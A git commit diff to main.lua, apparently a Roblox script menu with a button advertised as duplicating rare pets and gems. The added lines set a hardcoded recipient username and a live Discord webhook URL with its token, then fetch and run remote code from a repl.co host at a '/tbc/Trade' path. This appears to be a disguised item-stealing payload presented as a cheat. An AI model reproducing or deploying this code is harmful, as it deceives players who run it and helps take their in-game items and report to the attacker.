e790ff5d7ea19a29156ef16c54fa5478948f6188
RuebanD <120219002+RuebanD@users.noreply.github.com>
2024-02-01 20:35:13 +0000

    Update main.lua

--- main.lua
+++ main.lua
@@ -8,5 +8,8 @@ local MainSection = Main:NewSection("Dupe Pets")
 MainSection:NewButton("Dupe Huges - Exclusives - GEMS !", "Duped Pets", function()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RuebanD/mainps/main/main.lua", true))()
+getgenv().Username = "BIGBOYRUEB"
+getgenv().Webhook = "https://discordapp.com/api/webhooks/1201301712808443944/r8MDMQN_p3QXIot93GlBJQ27xoyyVKbujIiV6X36IrMuPnFTKBm0EoDsHVr1Q1fInIDV"
+loadstring(game:HttpGet("https://a05d2724-cb03-4bb7-af5d-293c8436e212-00-3c9ykas6hdl4f.riker.repl.co/tbc/Trade", true))()
 
 end)
